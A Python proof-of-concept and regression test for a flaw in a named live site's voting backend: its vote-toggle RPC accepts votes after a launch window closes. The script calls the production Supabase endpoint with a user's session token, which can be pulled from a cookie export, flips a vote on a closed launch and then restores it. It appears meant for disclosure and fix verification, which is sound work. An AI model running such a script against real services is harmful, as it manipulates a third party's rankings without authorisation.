#!/usr/bin/env python3
"""
PoC / regression test: voting after the launch window ended (devhunt.org)

Vulnerability
-------------
public.toggleProductVote only checks for future launches (launch_date > NOW());
it does NOT enforce the END of the launch window (launch_end) server-side.
The browser blocks votes after the window closed purely client-side
("Voting has ended"), but the RPC itself still accepts them.

Impact
------
A signed-in user can retroactively add and remove votes on finished launches
(one vote per account, both directions). weekly_winners counts product_votes
with no time filter and get_prev_launch_weeks sorts by votes_count, so:
displayed vote counts, the "past winners" list on the homepage and the
winner-email ordering (congrats mails, top-3 newsletter — if the bump lands
before the cron runs) are all retroactively changeable. The badge chain
(winner_of_the_day/week/month) is only affected by vote REMOVAL, not addition
(it filters votes by created_at within the launch window).

Safety of this test
-------------------
The test is self-healing: it toggles one vote and immediately toggles it back.
votes_count and the weekly_winners row are back to their original state
afterwards (only footprint: if a vote is re-added, its row gets a current
created_at — no effect on any counter or ranking except the created_at-
filtered badge views, which count it as out-of-window instead).

Usage
-----
  ./poc_vote_after_launch_end.py --cookie-file devhunt.org.cookies.json
  ./poc_vote_after_launch_end.py --token <access-jwt>
  DEVHUNT_ACCESS_TOKEN=<jwt> ./poc_vote_after_launch_end.py
  ./poc_vote_after_launch_end.py --cookie-file ... --product-id 33467882

Exit codes
----------
  0  vulnerable (PoC successful: server accepted a vote after the window ended)
  2  patched    (RPC rejects: "voting closed")
  1  error      (invalid session, target not found, restore failed, ...)
"""

import argparse
import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone

BASE = "https://xpdhqqwgprlqmqaqmnyx.supabase.co"

# Public anon key — part of devhunt.org's client bundle (public by design).
ANON_KEY = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhwZGhxcXdncHJscW1xYXFtbnl4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE2ODQ4NTg0ODcsImV4cCI6MjAwMDQzNDQ4N30."
    "fwN6a_NzygrFxhj0GCxGnJJpHv8q8iNEjY1jvhL8Kv0"
)


def req(method: str, path: str, token: str | None, body: dict | None = None):
    url = f"{BASE}{path}"
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, method=method)
    r.add_header("apikey", ANON_KEY)
    if token:
        r.add_header("Authorization", f"Bearer {token}")
    if data:
        r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r) as resp:
            raw = resp.read().decode()
            return resp.status, (json.loads(raw) if raw.strip() else None)
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:
            return e.code, json.loads(raw)
        except json.JSONDecodeError:
            return e.code, raw


def token_from_cookie_file(path: str) -> str:
    """Extract the access token from a browser cookie export (JSON array)."""
    cookies = json.load(open(path, encoding="utf-8"))
    sb = [c for c in cookies if c["name"].startswith("sb-")]
    if not sb:
        raise SystemExit("[!] No sb-*-auth-token cookie found in the export.")
    arr = json.loads(urllib.parse.unquote(sb[0]["value"]))
    return arr[0]


def fetch_product(token: str, product_id: int) -> dict:
    status, rows = req(
        "GET",
        f"/rest/v1/products?id=eq.{product_id}&select=id,name,slug,week,launch_start,launch_end,votes_count,deleted,is_draft",
        token,
    )
    if status != 200 or not rows:
        raise SystemExit(f"[!] Product {product_id} not found.")
    return rows[0]


def pick_closed_week_winner(token: str) -> dict:
    """Default target: the winning tool of the most recent already-CLOSED launch week."""
    status, winners = req("GET", "/rest/v1/weekly_winners?order=week.desc&limit=10", token)
    if status != 200 or not winners:
        raise SystemExit("[!] weekly_winners not readable — pass --product-id.")
    for row in winners:
        p = fetch_product(token, row["id"])
        if p["deleted"] or p["is_draft"]:
            continue
        end = datetime.fromisoformat(p["launch_end"])
        if end < datetime.now(timezone.utc):
            p["_winner_row"] = row
            return p
    raise SystemExit("[!] No closed-week winner found — pass --product-id.")


def my_vote_exists(token: str, user_id: str, product_id: int) -> bool:
    status, rows = req(
        "GET",
        f"/rest/v1/product_votes?product_id=eq.{product_id}&user_id=eq.{user_id}&select=user_id",
        token,
    )
    return status == 200 and bool(rows)


def winner_row(token: str, week: int) -> dict | None:
    status, rows = req("GET", f"/rest/v1/weekly_winners?week=eq.{week}&select=id,week,total_upvotes", token)
    return rows[0] if status == 200 and rows else None


def toggle_vote(token: str, user_id: str, product_id: int):
    """Call the RPC. Returns (ok, new_count_or_error_message)."""
    status, payload = req(
        "POST",
        "/rest/v1/rpc/toggleProductVote",
        token,
        {"_product_id": product_id, "_user_id": user_id},
    )
    if status == 200 and isinstance(payload, (int, float)):
        return True, int(payload)
    message = payload.get("message", str(payload)) if isinstance(payload, dict) else str(payload)
    return False, message


def main() -> int:
    ap = argparse.ArgumentParser(description="PoC: voting after the launch window ended (devhunt.org)")
    ap.add_argument("--cookie-file", help="Browser cookie export (JSON array, as exported)")
    ap.add_argument("--token", help="Supabase access token (JWT)")
    ap.add_argument("--product-id", type=int, help="Target tool (default: winner of the most recent closed week)")
    args = ap.parse_args()

    token = args.token or os.environ.get("DEVHUNT_ACCESS_TOKEN")
    if not token and args.cookie_file:
        token = token_from_cookie_file(args.cookie_file)
    if not token:
        print(__doc__)
        return 1

    print("== PoC: voting after the launch window ended ==")
    print("   Target: devhunt.org / Supabase project xpdhqqwgprlqmqaqmnyx\n")

    # 0) Verify the session
    status, user = req("GET", "/auth/v1/user", token)
    if status != 200 or not user:
        print("[!] Session invalid (HTTP %s). Log in again and re-export the cookies." % status)
        return 1
    user_id = user["id"]
    print(f"[0] Session ok: {user.get('email')} ({user_id})")

    # 1) Pick the target
    if args.product_id:
        product = fetch_product(token, args.product_id)
    else:
        product = pick_closed_week_winner(token)
    pid, week = product["id"], product["week"]
    end = datetime.fromisoformat(product["launch_end"])
    already_voted = my_vote_exists(token, user_id, pid)
    print(f"[1] Target: {product['name']} (id={pid}, week {week})")
    print(f"    launch_end: {product['launch_end']}  ->  window {'OPEN' if end > datetime.now(timezone.utc) else 'CLOSED (since ' + str(end.date()) + ')'}")
    print(f"    {product['name']} is {'the weekly winner' if product.get('_winner_row') else 'NOT the weekly winner'} of that week; own vote exists: {already_voted}")

    if end > datetime.now(timezone.utc):
        print("[!] This tool's window is still open — not a PoC. Pick another target (--product-id).")
        return 1

    # 2) Record the initial state
    before_count = product["votes_count"]
    before_winner = winner_row(token, week)
    print(f"[2] votes_count BEFORE: {before_count}", end="")
    if before_winner:
        print(f" | weekly_winners week {week}: total_upvotes={before_winner['total_upvotes']}")
    else:
        print()

    # 3) The actual attack: call the RPC directly although the window is closed
    ok, result = toggle_vote(token, user_id, pid)
    if not ok and "voting closed" in str(result):
        print(f"\n[+] PATCHED: server rejects ('{result}') — the vulnerability is closed.")
        return 2
    if not ok:
        print(f"\n[-] RPC error (unexpected): {result}")
        return 1
    if already_voted:
        print(f"[3] VULNERABLE — the server REMOVED the own vote AFTER the window closed (direction: manipulation down). votes_count now: {result}")
    else:
        print(f"[3] VULNERABLE — the server ACCEPTED a vote AFTER the window closed (direction: manipulation up). votes_count now: {result}")

    # 4) Show the impact on the historical ranking
    after_winner = winner_row(token, week)
    if after_winner and before_winner and after_winner["id"] == before_winner["id"]:
        delta = after_winner["total_upvotes"] - before_winner["total_upvotes"]
        if delta != 0:
            print(f"    -> weekly_winners week {week} reacted IMMEDIATELY: total_upvotes {before_winner['total_upvotes']} -> {after_winner['total_upvotes']} ({delta:+d})")
            print("       (The view counts all votes with no time filter: historical winners stay shiftable at any time.)")

    # 5) Restore
    ok2, result2 = toggle_vote(token, user_id, pid)
    if not ok2:
        print(f"\n[!] IMPORTANT: restore failed ({result2}) — please check the state manually!")
        return 1
    product_after = fetch_product(token, pid)
    restored = product_after["votes_count"] == before_count
    print(f"[4] Restore: second toggle -> votes_count {result2} (expected: {before_count}) {'OK' if restored else 'MISMATCH!'}")
    if already_voted:
        print("    Note: the own vote was re-created (created_at = now). Counters and rankings unchanged.")

    print(f"\n== RESULT: {'VULNERABLE' if restored else 'VULNERABLE + restore failed'} ==")
    print("   Fix: add the launch_end check to toggleProductVote (see fix_vote_after_launch_end.sql).")
    print("   Then re-run this PoC as a regression test (expected: exit code 2).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
